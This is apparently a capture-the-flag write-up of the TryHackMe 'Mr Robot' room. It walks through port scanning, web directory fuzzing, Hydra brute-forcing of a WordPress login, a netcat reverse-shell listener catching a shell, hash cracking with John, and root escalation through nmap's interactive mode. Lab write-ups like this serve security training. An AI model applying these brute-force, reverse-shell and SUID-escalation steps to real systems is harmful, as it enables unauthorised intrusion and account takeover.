---
title: "TryHackme: Mr Robot CTF"
author: NeoVirex
categories: [TryHackMe]
tags: [thm]
render_with_liquid: false
media_subpath: /images/tryhackme/tryhackme_mr_robot_ctf/
image:
  path: room_img.jpeg
description: " It tests your skills in web exploitation, enumeration, and privilege escalation using real-world hacking techniques."
---

Created: April 5, 2025 12:10 PM
Finishing Date: April 5, 2025 12:00 AM (EDT) → 12:00 AM
Status: Done

## Reconnaissance

```
└─$ rustscan -a 10.10.254.98
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/nei/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 4900'.
Open 10.10.254.98:80
Open 10.10.254.98:443
^C
                   
```

## Service Enumeration

![Screenshot From 2025-04-05 12-17-58.png](img1.png)

![Screenshot From 2025-04-05 12-18-34.png](img2.png)

## Web Application Analysis

```
                                                                                                                                                  
┌──(nei㉿kali)-[~]
└─$ ffuf -u http://10.10.254.98/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.254.98/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.hta                    [Status: 403, Size: 213, Words: 16, Lines: 10, Duration: 137ms]
.htaccess               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 143ms]
.htpasswd               [Status: 403, Size: 218, Words: 16, Lines: 10, Duration: 142ms]
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 693ms]
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 727ms]
admin                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 132ms]
audio                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 131ms]
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 688ms]
blog                    [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 128ms]
css                     [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 141ms]
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 690ms]
favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 622ms]
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 725ms]
images                  [Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 138ms]
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 715ms]
index.html              [Status: 200, Size: 1158, Words: 189, Lines: 31, Duration: 166ms]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 693ms]
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 143ms]
js                      [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 142ms]
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 197ms]
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 698ms]
page1                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 716ms]
phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 134ms]
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 142ms]
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 683ms]
render/https://www.google.com [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 722ms]
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 142ms]
robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 126ms]
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 697ms]
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 717ms]
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 131ms]
sitemap.xml             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 129ms]
video                   [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 141ms]
wp-admin                [Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 140ms]
wp-content              [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 137ms]
wp-includes             [Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 131ms]
wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 661ms]
wp-cron                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 637ms]
wp-links-opml           [Status: 200, Size: 227, Words: 13, Lines: 11, Duration: 610ms]
wp-load                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 645ms]
wp-login                [Status: 200, Size: 2606, Words: 115, Lines: 53, Duration: 655ms]
wp-settings             [Status: 500, Size: 0, Words: 1, Lines: 1, Duration: 597ms]
wp-mail                 [Status: 500, Size: 3064, Words: 212, Lines: 110, Duration: 748ms]
wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 643ms]
xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 858ms]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1, Duration: 860ms]
:: Progress: [4744/4744] :: Job [1/1] :: 57 req/sec :: Duration: [0:01:27] :: Errors: 0 ::
              
```

## Vulnerability Scanning

![Screenshot From 2025-04-05 12-50-01.png](img3.png)

```
$ hydra -L test.dic -p test 10.10.254.98 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username"            

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-05 13:06:20
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries (l:12/p:1), ~1 try per task
[DATA] attacking http-post-form://10.10.254.98:80/wp-login.php:log=^USER^&pwd=^PASS^:Invalid username
**[80][http-post-form] host: 10.10.254.98   login: Elliot   password: test**
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-05 13:06:21
                                                                                     
```

```
└─$ hydra -l Elliot -P fsocity.dic 10.10.254.98 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username" -t 30

Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-05 13:16:13
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 30 tasks per 1 server, overall 30 tasks, 858236 login tries (l:1/p:858236), ~28608 tries per task
[DATA] attacking http-post-form://10.10.254.98:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username
**[80][http-post-form] host: 10.10.254.98   login: Elliot   password: ER28-0652**
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-05 13:16:26
```

- `l Elliot` = single username
- `P fsocity.dic` = password list (from the Mr. Robot room)
- `10.10.254.98` = target IP
- `http-post-form` = type of attack
- `"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"`:
    - **URL Path**: `/wp-login.php`
    - **POST fields**:
        - `log=^USER^` → Hydra replaces this with `Elliot`
        - `pwd=^PASS^` → Hydra replaces this with each password
        - `wp-submit=Log+In` → required submit button field
    - **Failure message**: use part of the error message to detect failure (`ERROR`)
- `t 30` = 30 tasks in parallel (can adjust)

## Exploit & Initial Access

![Screenshot From 2025-04-05 12-50-01.png](img4.png)

![Screenshot From 2025-04-05 13-59-23.png](img5.png)

![Screenshot From 2025-04-05 13-59-39.png](img6.png)

```
──(nei㉿kali)-[~/pro/mr.ro]
└─$ rlwrap  nc -lvnp 53
listening on [any] 53 ...
connect to [10.23.89.97] from (UNKNOWN) [10.10.112.208] 56674
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 17:56:59 up 12 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$
```

## Privilege Escalation

```
$ ls
bin
boot
dev
etc
home
initrd.img
lib
lib64
lost+found
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
$ cd home
$ ls
robot
$ cd robot
$ ls
key-2-of-3.txt
password.raw-md5
$ cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
$ python3 -m http-server 444
/usr/bin/python3: No module named http-server
$ ls
key-2-of-3.txt
password.raw-md5
$ cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
$ 

```

```
└─$ john hash.txt --wordlist=fsocity.dic --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2025-04-05 14:04) 0g/s 8580Kp/s 8580Kc/s 8580KC/s charset..abcdefghijklmnopqrstuvwxyz

```

```
$ python -c 'import pty; pty.spawn("/bin/bash")'

daemon@linux:/home/robot$ 
daemon@linux:/home/robot$ 
└─$ rlwrap  nc -lvnp 53
listening on [any] 53 ...
connect to [10.23.89.97] from (UNKNOWN) [10.10.112.208] 56676
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 18:15:29 up 30 min,  0 users,  load average: 0.00, 0.01, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$  find / -perm +6000 2>/dev/null | grep '/bin/'
 find / -perm +6000 2>/dev/null | grep '/bin/'
/bin/ping
/bin/umount
/bin/mount
/bin/ping6
/bin/su
/usr/bin/mail-touchlock
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/screen
/usr/bin/mail-unlock
/usr/bin/mail-lock
/usr/bin/chsh
/usr/bin/crontab
/usr/bin/chfn
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/expiry
/usr/bin/dotlockfile
/usr/bin/sudo
/usr/bin/ssh-agent
/usr/bin/wall
/usr/local/bin/nmap

             
                              
```

## Lateral Movement

```
└─$ rlwrap  nc -lvnp 53
listening on [any] 53 ...
connect to [10.23.89.97] from (UNKNOWN) [10.10.112.208] 56677
Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux
 18:16:28 up 31 min,  0 users,  load average: 0.27, 0.09, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
daemon@linux:/$ /usr/local/bin/nmap --interactive
/usr/local/bin/nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> !sh
!sh
# whoami
whoami
root
# ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv  tmp  var
boot  etc  initrd.img  lib64  media       opt  root  sbin  sys  usr  vmlinuz
# cd root
cd root
# ls
ls
firstboot_done  key-3-of-3.txt
# cat key-3-of-3.txt
cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4
# 

```

<style>
.center img {display:block; margin:auto;}
.wrap pre{white-space: pre-wrap;}
</style>
